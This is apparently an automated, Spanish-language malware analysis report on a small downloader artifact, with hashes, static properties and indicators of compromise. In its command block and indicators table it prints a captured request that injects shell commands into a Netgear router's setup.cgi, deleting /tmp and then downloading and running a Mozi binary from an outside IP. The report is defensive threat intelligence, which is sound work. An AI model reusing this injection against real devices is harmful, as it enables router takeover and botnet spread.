# 🧬 Payload Analysis

`296d3e3f96e08c90c11baa425c2e4314e2d42286e5d84d32196a8390f91ab985`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 175 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `netgear` en `hxxp://125.40.76.XXX:58691/Mozi.m+-O+/tmp/netgear`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:05:52.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `296d3e3f96e08c90c11baa425c2e4314e2d42286e5d84d32196a8390f91ab985`
- **SHA1:** `a21d787121123fe814d244c4f96c1b5b937e2bdb`
- **MD5:** `842f50cdf5d81b7e4b10205054f0b9da`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 175 B |
| Entropía | 5.2 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://125.40.76.XXX:58691/Mozi.m+-O+/tmp/netgear
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://125.40.76.XXX:58691/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 125.40.76.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://125.40.76.XXX:58691/Mozi.m+-O+/tmp/netgear | strings |
| hash | 296d3e3f96e08c90c11baa425c2e4314e2d42286e5d84d32196a8390f91ab985 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
